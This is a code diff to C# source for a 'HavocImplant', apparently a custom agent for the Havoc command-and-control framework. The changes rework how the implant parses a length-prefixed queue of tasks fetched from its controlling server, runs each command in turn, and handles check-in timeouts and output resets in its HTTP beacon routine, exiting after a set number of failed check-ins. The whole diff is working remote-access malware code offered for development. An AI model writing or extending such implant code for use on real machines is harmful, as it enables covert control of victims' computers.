@@ -47,20 +47,35 @@ namespace HavocImplant
         static void Main(string[] args)
         {
             Implant implant = new Implant();
+            List<String> taskArray = new List<String>();
             while (!implant.registered) implant.Register();
             Console.WriteLine($"Implant will disconnect after {implant.maxTries} fails");
             Console.WriteLine($"Implant will consider {implant.timeout/1000} as the timeout");
             while (true)
             {
                 Console.WriteLine($"Failed Checkins: {implant.timeoutCounter}");
-                string commands = implant.CheckIn(implant.outputData);
+                string rawTasks = implant.CheckIn(implant.outputData);
                 //implant.outputData = "";
-                if (commands.Length > 4)
+                if (rawTasks.Length > 4)
                 {
-                    string[] commandsArray = commands.Split(new string[] { commands.Substring(0, 4) }, StringSplitOptions.RemoveEmptyEntries);
-                    Console.WriteLine("Command Queue length: {0}", commandsArray.Length);
-                    foreach (string command in commandsArray)
+                    //string[] commandsArray = commands.Split(new string[] { commands.Substring(0, 4) }, StringSplitOptions.RemoveEmptyEntries);
+                    int offset = 0;
+                    string task = "";
+                    while (offset < rawTasks.Length)
                     {
+                        int size = BitConverter.ToInt32(Encoding.UTF8.GetBytes(rawTasks.Substring(offset, 4)), 0); // [4 bytes containing size of task + 2][task]
+                        Console.WriteLine($"Task is of size {size}");
+                        if (offset == 0) { task = rawTasks.Substring(offset + 4, size ).Trim(); }
+                        else { task = rawTasks.Substring(offset+4, size).Trim(); }
+                        Console.WriteLine("Task is {0}", task);
+                        offset += size+4;
+                        taskArray.Add(task);
+                    }
+
+                    Console.WriteLine("Task Queue length: {0}", taskArray.Count);
+                    for (int i = 0; i < taskArray.Count; i++)
+                    {
+                        string command = taskArray[i];
                         Console.WriteLine("Read command: {0}", command);
 
                         List<byte> commandBytes = Encoding.UTF8.GetBytes(command.Split(' ')[0]).ToList();
@@ -80,6 +95,9 @@ namespace HavocImplant
                                 sleepThread.Start();
                                 break;
                         }
+                        Console.WriteLine("Output Data: {0}", implant.outputData);
+                        taskArray.Remove(command);
+                        i--;
                     }
                 }
                 Thread.Sleep(implant.sleepTime);
@@ -170,6 +188,7 @@ namespace HavocImplant
         public string sendReq(string requestBody, byte[] agentHeader)
         {
             string responseString = "";
+            bool reqSuccess = false;
             var request = (HttpWebRequest)WebRequest.Create(url);
 
             ArrayList arrayList = new ArrayList();
@@ -194,6 +213,11 @@ namespace HavocImplant
 
                 byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                 responseString = Encoding.UTF8.GetString(bytes);
+                if (responseString.Length > 0)
+                {
+                    outputData = "";
+                    timeoutCounter = 0;
+                }
                 timeoutCounter = 0;
             }
             catch (WebException ex)
@@ -204,7 +228,6 @@ namespace HavocImplant
 
                     byte[] bytes = Encoding.UTF8.GetBytes(new StreamReader(response.GetResponseStream()).ReadToEnd());
                     responseString = Encoding.UTF8.GetString(bytes);
-                    timeoutCounter = 0;
                 }
                 if (ex.Status == WebExceptionStatus.Timeout)
                 {
@@ -212,6 +235,7 @@ namespace HavocImplant
                     if (timeoutCounter == maxTries) Environment.Exit(Environment.ExitCode);
                 }
             }
+            
             outputData = "";
             return responseString;
         }
